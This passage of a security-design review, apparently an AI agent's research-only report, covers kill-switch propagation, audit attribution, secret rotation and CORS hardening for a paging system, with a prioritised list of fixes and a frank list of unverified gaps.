1. **<5s vs industry**: LaunchDarkly <200ms (streaming) vs our <5s — ~25× slower than the realtime tier, but in the exchange-kill-switch tier (seconds to cancel-all + restrict). For our failure direction, 5s costs *wrongly-suppressed pages* (suppressions leaking post-switch), not wrongly-sent ones. Acceptable **iff** in-flight races provably resolve fail-open (they do today) — but tighten toward sub-second on the broadcast path, because the dominant risk is **coverage**: the drill verified the forwarder halt, but the switch must reach *every* path — `_secondary_scan`, `send_direct`, storm-digest path, control-plane pages. One unenumerated path = the adversary's tunnel.
2. **The "decision made 1ms before, forwarded 1ms after" race** is resolved by timing luck + fail-open default today, not by construction. The generation-counter pattern makes it principled: stamp every decision record and outbox row with the kill epoch; check at claim time AND attempt time; stale epoch → page as fail-open with `reason="kill_switch"`.
3. **Kill-switch attribution dies in shadow mode** (verified in code). Indistinguishable from routine shadow traffic — the audit failure the real world explicitly warns against.
4. **No re-arm discipline**: nothing requires dual attestation, cooldown, or confirmation to re-arm.

### Principled fix direction (₹0)
1. **Kill epoch counter**: monotonic `kill_epoch` in the control plane. Kill = one atomic increment + broadcast. Every `DecisionRecord` and outbox row carries `kill_epoch_born`. Enforcement points — gate evaluation, `claim_due_rows`, `_attempt`, `send_direct`, secondary scan — fail-open on `born_epoch < current_epoch`: stale-epoch suppression work becomes a page, never a silent drop.
2. **Broadcast, not poll, for the fast path**: in-process pub/sub (or file-watch on the epoch file) wakes the forwarder loop in milliseconds; the epoch check is the correctness backstop even if broadcast is lost. Target: sub-second halt.
3. **Delivery-path registry + extended drill**: enumerate primary forwarder, `_secondary_scan`, `send_direct`, storm-digest path, `enqueue_control_plane_page`; the drill asserts *each* path halts/drains; any path not in the registry is a finding.
4. **Fix shadow-mode attribution**: keep the causal reason (`kill_switch`, `policy`, …) and add a separate `shadow: true/false` / `mode` field. Rule: *the mode of observation must never overwrite the cause of the decision.* Composite display (`kill_switch · shadow`) is fine; lossy rewrite is not.
5. **Re-arm discipline**: dual attestation + mandatory cooldown + explicit audit record. Instant one-sided kill, slow multi-party re-arm.
6. **Size the drain budget honestly**: measure worst-case forwarder drain and set `drain()` timeout against it with headroom — not a round 30s.
7. **Kill switch must not depend on the identity plane**: the actuator (file, local CLI) must work when auth/SSO/approvers are down. A kill switch that needs the systems it protects is theater.

---

## THE 5 INFRA TRUTHS FOR PRODUCTION

1. **Rotation is the security posture.** Every secret we hold (BYOK keys, webhook signing secrets) must be rotatable with zero downtime: dual-accept on the wire, overlap windows, one-click UI rotate, forced-expiry nudges. The industry's unanimous lesson: the rotation mechanism is designed *before* the first secret is issued, not after the first leak. This is the single highest-leverage ₹0 upgrade.
2. **CORS is a fence, not a boundary.** The browser-side read policy can only ever be defense-in-depth. The real boundary is a credential on every request: per-install operator Bearer <redacted> on the platform server, HMAC on the ingest edge. Design the fence (exact-origin default) AND the boundary (tokens) — never confuse one for the other.
3. **Emergency power must be more visible than normal power.** Kill-switch pages, break-glass grants, re-arms — all recorded under distinct identities with *more* fields than routine actions, in the tamper-evident log, with out-of-band alarms. Anything that makes an emergency action look routine (the shadow `reason` rewrite) is a defect, not a cosmetic issue.
4. **One primitive, two uses: the generation counter.** Break-glass revocation and kill-switch propagation are the same pattern — monotonic epoch + check-at-use-time. Implement one `Generation` primitive; use it twice. A token trusted on signature alone is unrevocable; an epoch checked at every enforcement point is revocation by construction.
5. **Fail-closed is a boot property, not a runtime hope.** Missing webhook secret, missing master key, legacy-accept flags, wildcard CORS, unauthenticated write surfaces — every one of these must be *impossible* in production by construction (startup assertions, env gates, 401-by-default), because the n8n CVE and every fail-open incident in the literature show that runtime flag-checks are exactly where implementations silently fail.

---

## FIX PRIORITY (principal judgment)

- **P0 — the unauthenticated KEYS surface.** Per-install operator Bearer <redacted> on every `/api/*` (401 without it) + flip the CORS default to the Pages origin. Any website the operator visits can currently overwrite their paging keys. This is actively exploitable and the fix is pure code.
- **P1 — kill-switch shadow attribution.** Stop rewriting `reason`; add the `mode`/`shadow` field. Audit integrity for the most safety-critical action in the system.
- **P2 — rotation everywhere.** Multi-secret webhook rotation (wire-level dual-accept) + BYOK rotate/revoke UX with overlap window. The industry's unanimous lesson; zero infra.
- **P3 — secrets at rest.** AES-256-GCM envelope for BYOK keys and webhook secrets; write-only store contract; key-scoped audit log (proving keys were only used for their pages).
- **P4 — break-glass design.** The `breakglass` role, JIT grants with generation-counter revocation, out-of-band alarm, mandatory 24h review. Zero today; the design reuses machinery we already own.
- **P5 — hardening depth.** Signed delivery ID on the ingest edge, per-endpoint webhook secrets, kill epoch + broadcast + delivery-path registry drill, re-arm discipline, measured drain budgets.

## What NOT to do
- Don't build KMS integration or add a secrets-manager dependency (₹0 law; envelope encryption with an env KEK is the ₹0 shape).
- Don't widen the replay window "for convenience."
- Don't keep the onboarding legacy-accept path reachable in production.
- Don't add `Access-Control-Allow-Credentials: true` — ever, with our architecture.
- Don't treat the 300s window as the whole replay story — the timestamp proves freshness, the signed ID proves uniqueness; you need both.
- Don't let the kill switch depend on the identity plane it protects.

---

## HONEST GAPS (couldn't verify)
- PagerDuty's dashboard-side masking of integration keys (their developer docs cover outbound webhook signing in detail; integration-key UI masking behavior is inside the product).
- Netlify-specific env-secret write-only behavior (Vercel was the verifiable exemplar).
- The missing-`SENTINEL_WEBHOOK_SECRET`-in-production code path — stated fail-closed, but the receiver lines were only grepped, not read in full. **Verify-before-ship.**
- Whether a second signing secret / rotation mechanism already exists in the config layer.
- Whether the prod console currently sends `Authorization` anywhere (preflight allows it; presumably placeholder).
- Chrome's private-network-access preflight possibly blunting the localhost attack chain — browser-specific, not a defense to rely on; untested.
- PagerDuty's *internal* emergency-access mechanics (incident-commander is coordination, not an access override) — no public source found.
- Google Borg/oncall break-glass specifics; incident.io's break-glass product specifics — not found in public docs.
- The 7/7 PASS kill-switch drill numbers come from the lane brief, not from a drill doc readable on this branch (the on-branch drill doc covers a different drill).
- The prod console's backend-URL obtain/store mechanism (`build-static.py` read only at docstring level) — the token-storage recommendation assumes localStorage, needs confirmation from console code.
- 1Password Connect's server-side secret-rotation story — partially verified, treat with care.

---

*Research-only lane. No code was changed. Every recommendation above is implementable at ₹0 operating budget with the existing stack (stdlib + the one pinned `cryptography` dependency).*
